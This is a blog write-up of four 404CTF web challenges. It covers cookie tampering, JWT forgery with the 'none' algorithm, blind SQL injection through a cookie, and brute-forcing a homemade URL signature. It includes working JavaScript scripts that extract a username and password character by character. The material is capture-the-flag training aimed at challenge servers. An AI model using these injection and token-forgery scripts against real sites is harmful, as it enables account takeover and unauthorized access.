---
layout: "@layouts/blog/Layout.astro"
title: "404CTF Writeup - Web category"
description: "Topics include Bypassing authentication, SQL injections, template injections, ..."
author: "Majed Abdennadher"
timestamp: 1687280554256
duration: 10
tag: "404CTF"
slug: "web-challenges"
language: "english"
image: "/static/media/404ctf/event_logo.png"
keywords:
  ["Cybersecurity", "404CTF", "Diverse"]
links: ["intro"]
---

### [Le loup et le renard](https://ctf.404ctf.fr/challenges#Le%20Loup%20et%20le%20renard-88)

As this is the first challenge, we expect an easy solution.
We visit the [website](https://le-loup-et-le-renard.challenges.404ctf.fr/) and look at the sources:

![](/static/media/404ctf/le-loup-et-le-renard-1.png)

This brings us to the [2nd part](https://le-loup-et-le-renard.challenges.404ctf.fr/fable/partie-2-cookie) of the challenge.

Following the page title `Part 2: Cookie`, we look at the cookies sent by the server: 

![](/static/media/404ctf/le-loup-et-le-renard-2.png)

Change the value from `isAdmin` to `true` and refresh the web page. This redirects you to the [3rd part](https://le-loup-et-le-renard.challenges.404ctf.fr/fable/partie-3-redirect) of the challenge.

Looking at the sources: ![](/static/media/404ctf/le-loup-et-le-renard-3.png)

We can see that if we send this form, we'll be taken to the 4th page, which contains the flag (as the page's url indicates). The only problem is that you're quickly redirected to the 3rd page again. This is usually a script that redirects (as opposed to a server redirect).

There are many ways of bypassing the execution of this script. I initially tried running a `curl` to the page and it worked!

![](/static/media/404ctf/le-loup-et-le-renard-4.png)

As the flag indicates, the page may have been protected by an authentication mechanism, in which case the command will be more complicated.

### [L'Académie du détail](https://ctf.404ctf.fr/challenges#L'Acad%C3%A9mie%20du%20d%C3%A9tail-18)

We visit the [website](https://academie.challenges.404ctf.fr/) and do some exploring.
Nothing interesting after looking at the sources so we turn out attention to the [authentication page](https://academie.challenges.404ctf.fr/login).
This page let you login as any user with any password, except for the `admin` account which is already valuable information.

When authenticating to a web server, the natural question to ask is: What is the authentication method ? The Most common method is using cookies, so we check them out:

![](/static/media/404ctf/l-academie-du-detail-1.png)

And we're not wrong my friend, we have on our hands what looks (and is) like a JWT. When can check this out by using websites like [jwt.io](https://www.jwt.io):

![](/static/media/404ctf/l-academie-du-detail-2.png)

This token is encoding my username and an expiration date. Given the hint we have received earlier about the `admin` account, the natural course of action would be to forge an JWT containing
`{"username": "admin"}`.
In general this is not possible because JWTs are cryptographically signed, but maybe the web developer skipped the security section of when implementing JWT into his server.
Let's try the oldest trick in the book, in header when change the signature algorithm to "none", effectively disabling the validy check of the token.

I have found this [website](https://www.gavinjl.me/edit-jwt-online-alg-none/) than can do this (but you can write your python script if you'd like).

![](/static/media/404ctf/l-academie-du-detail-3.png)

Swapping the token in the token with this new value and reloading the page should show us that we're logged in as `admin`. Let's now visit the `/members` protected route.

![](/static/media/404ctf/l-academie-du-detail-4.png)

And that's it, it worked !

### [La Vie Française](https://ctf.404ctf.fr/challenges#La%20Vie%20Fran%C3%A7aise-113)

We visit the [website](https://academie.challenges.404ctf.fr/) and do some exploring:
To sum it up:
- We can create an account and log in into it
![](/static/media/404ctf/la-vie-française-1.png)

- we are then redirected to `/account` which is an SSR can somehow relates to the account type.
![](/static/media/404ctf/la-vie-française-2.png)

Some restrictions on the form inputs:
- Only alphanumeric characters are allowed
- the `admin` account is deactivated by the administrator

I first thought about using an SQL injection attack to retrieve some information about the database, and eventually log into a privileged account.
However, restrictions rule out this technique because SQL payloads need quotes or comments.
Before dropping this idea and moving to something else, I had to checkout the cookies (always check your authentication method) and the server sets it to `uuid=e212...`.
If we try to use an SQL injection attack the `uuid` field of the cookie, it works !

```javascript
const testUsername = async (username) => {
  const response = await fetch("https://la-vie-francaise.challenges.404ctf.fr/account", {
    redirect: "manual",
    headers: {
      "Cookie": `uuid=' OR username LIKE '${username}%`
    }
  });

  // otherwise a redirection code 3xx
  return response.status === 200;
}
```

This method (and others similar) allow us to construct a valid `username` character by character (because of the % in the end) and since we are restricted to alphanumeric, it won't take long.

For the username, we try different requests and we see that the user `madeleineforestier` account have a link to an `/admin` protected route. It means this is the account we want to hack.

Here is an implementation for testing all the next characters in the passwords and outputting the next one:

```javascript
const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('')

const testPassword = async (password) => {
  const response = await fetch("https://la-vie-francaise.challenges.404ctf.fr/account", {
    redirect: "manual",
    headers: {
      "Cookie": `uuid=' OR username = 'madeleineforestier' AND password LIKE '${password}%`
    }
  });

  return response.status === 200;
}

const flood = (prefix) =>
  Promise.all(characters.map(c => testPassword(prefix + c)))

const crack = async (prefix) => {
  let safetyCount = 0;
  while ( safetyCount < 100) {
    console.log("Now at length", prefix.length + safetyCount++, "=>", prefix);
    const charIsValid = await flood(prefix);
    console.log(charIsValid)
    const nextIndex = charIsValid.indexOf(true);
    const finished = nextIndex ===  -1;
    if ( finished ) break;
    prefix += characters[nextIndex]
  }

  return prefix;
}

crack("").then(console.log)
//madeleineforestier:fo2dvkgshz2ppj
```

We try those credentials and access the `/admin` route for the flag.
![](/static/media/404ctf/la-vie-française-3.png)


### [Fuite en 1791](https://ctf.404ctf.fr/challenges#Fuite%20en%201791-19)

We visit the [challenge website](https://ddfc.challenges.404ctf.fr/). After walking around, we find that the flag url is given to url, but it is protected by an expiry date and a signature.
![](/static/media/404ctf/fuite-en-1791-1.png)


It looks like we have to forge a new signature for an expiry date of our liking. In general this is not possible because the link (or any part of) is cryptographically signed.
But maybe could have inveted his own signature algorithm, in which can we can try to reverse it or crack it.

![](/static/media/404ctf/fuite-en-1791-2.png)
 
Let's try out different values of the `expiry` and `signature` and we notice that some values do work (return "Expired Link" instead of "Invalid signature"), For example: "expiry=-5625891070&signature=wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sv".
The signature looks be a base64 encoding for the expiry value + maybe some salt or something similar.

I ran out this experiment a bit furthur, my initial goal was to get the right signature for `expiry=-0000000000` and these are the results I got:

```javascript
// -1th of signature depend on -1th of expiry
// s(i) = 47 - i
// -2th of signature depend on -2th of expiry
// s(i) = 48 + 4*i - 32*(i / 4 | 0)
// -3-4th of signature depend on -3th of result
//s(i) = 63 - 16*i + 64*(4 + (i / 4 | 0))
// -5th of signature depend on -4th of result
// 4+(i % 4) - 8*(i/4 | 0)*(i/4 is odd)
...
```

This was a tedious work, perhaps because of a wrong choice of basis/encoding, but it reveals a relevant pattern:
The signature depends on 1 or 2 characters of the expiry and the dependency goes in like `1 1 2 1 1 2 ...`.

It time to set an easier goal: change the expiry from `expiry=-5625891070` to `expiry=+5625891070`.
The target charcater is at the `-11th` location, we expect it to change the `-14th` character of the signature, we can just brute force (easier because I haven't worked out a nice formula).

Here is a script that does just that:

```javascript
const base = "https://ddfc.challenges.404ctf.fr/ddfc"
const queries = {
  expiry: "-5625891076",
  signature: "wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sp"
};

const base64 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'];
const base64encode = (number) => {
  output = "";
  while ( number ) { output = base64[number % 64] + output; number = number / 64 | 0; }
  return output;
}

const buildUrl = (base, queries) => base + "?" + Object.entries(queries).map(([n, v]) => `${n}=${v}`).join('&');
const checkUrl = async (base, entries) => {
  const url = buildUrl(base, entries);
  const response = await fetch(url);
  const content = await response.text();
  return content.indexOf("Invalid") < 0;
}

const replaceIndex = (str, i, c) => str.slice(0, i) + c + (i == -1 ? "" : str.slice(i+1))

const findSignature = async () => {
  // launch 64 requests at once
  const expiry = replaceIndex(queries.expiry, -11, '+');
  const results = await Promise.all(base64.map(c => checkUrl(base, {
    expiry,
    signature: replaceIndex(queries.signature, -14, c)
  })));
    
  const index = results.indexOf(true);
  console.log("url", expiry, replaceIndex(queries.signature, -14, base64[index]))

  return base64[index];
};

const main = async () => {
  console.log(await findSignature());
};

main();
// url +5625891076 wawF6dC4Hz9g5NyCc371KCDcfztFE/sp
// 7
```

If the try that url, we get the human rights declaration and in the bottom of the page, the flag:
![](/static/media/404ctf/fuite-en-1791-3.png)
 